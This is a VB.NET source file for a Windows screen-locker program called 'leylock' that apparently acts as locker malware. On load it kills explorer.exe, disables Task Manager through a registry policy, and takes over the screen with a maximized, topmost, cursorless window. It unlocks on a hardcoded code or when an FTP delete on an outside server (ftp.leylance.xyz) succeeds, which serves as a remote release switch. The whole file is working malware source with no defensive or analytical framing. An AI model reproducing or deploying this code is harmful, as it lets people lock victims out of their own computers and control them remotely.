Imports System.IO
Imports System.Net

Public Class leylock
    Dim userpanel As String = My.Settings.userpanel
    Dim panelpass As String = My.Settings.panelpass
    Private Sub leylock_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Shell("taskkill /f /im explorer.exe")
        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Cursor = Cursors.No
        locker.Start()
    End Sub
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        If TextBox1.Text = "12345" Then
            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
            Process.Start("explorer")
            Me.Close()
        End If
    End Sub

    Private Sub locker_Tick(sender As Object, e As EventArgs) Handles locker.Tick
        unlockdev()
    End Sub

    Private Sub unlockdev()


        Try
            Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance"), System.Net.FtpWebRequest)
            mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
            mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize
            'My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance", "unlcko.llance", "u945780831." + userpanel, panelpass)
            'mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            unlck()
        Catch ex As WebException
            Dim checkreq As FtpWebResponse = ex.Response
            If FtpStatusCode.ActionNotTakenFileUnavailable = checkreq.StatusCode Then

            End If
        End Try
    End Sub
    Private Sub unlck()
        locker.Stop()
        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
        Process.Start("explorer")
        Me.Close()
    End Sub

End Class